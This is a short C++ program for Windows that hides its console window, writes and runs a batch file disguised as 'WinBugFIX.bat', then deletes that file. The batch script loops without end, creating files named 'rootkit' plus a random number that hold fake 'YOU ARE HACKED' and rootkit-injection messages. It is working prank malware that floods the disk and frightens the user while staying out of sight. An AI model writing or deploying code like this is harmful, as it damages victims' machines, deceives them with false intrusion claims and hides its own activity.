#include <iostream>
#include <windows.h>
#include <errno.h>

int main(int argc, char* argv[])
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);

    FILE* a;
    errno_t err = fopen_s(&a, "WinBugFIX.bat", "ab+");
    if (a != 0) {
        fclose(a);
    }

    FILE* fp;

    errno_t err1 = fopen_s(&fp, "WinBugFIX.bat", "w");
    if (fp != 0) {
        fprintf(fp, "echo off\n:start\necho ==   YOU ARE HACKED   ==>rootkit%%random%%.txt\necho INJECTC %%random%%/SYS/ROOT . . . DONE>rootkit%%random%%.txt\necho MOVEC %%random%%/SYS/ROOT . . . DONE>rootkit%%random%%.txt\necho BACKD %%random%%/SYS/ROOT . . . DONE>rootkit%%random%%.txt\necho ENCRYPTD %%random%%/SYS/ROOT . . . DONE>rootkit%%random%%.txt\necho STORED %%random%%/SYS/ROOT . . . DONE>rootkit%%random%%.txt\necho . . . COMPLETED INJECTION OF ROOTKIT>rootkit%%random%%.txt\ngoto start");
        fclose(fp);
    }

    system("WinBugFIX.bat");
    Sleep(10);
    remove("WinBugFIX.bat");
    return 0;
}
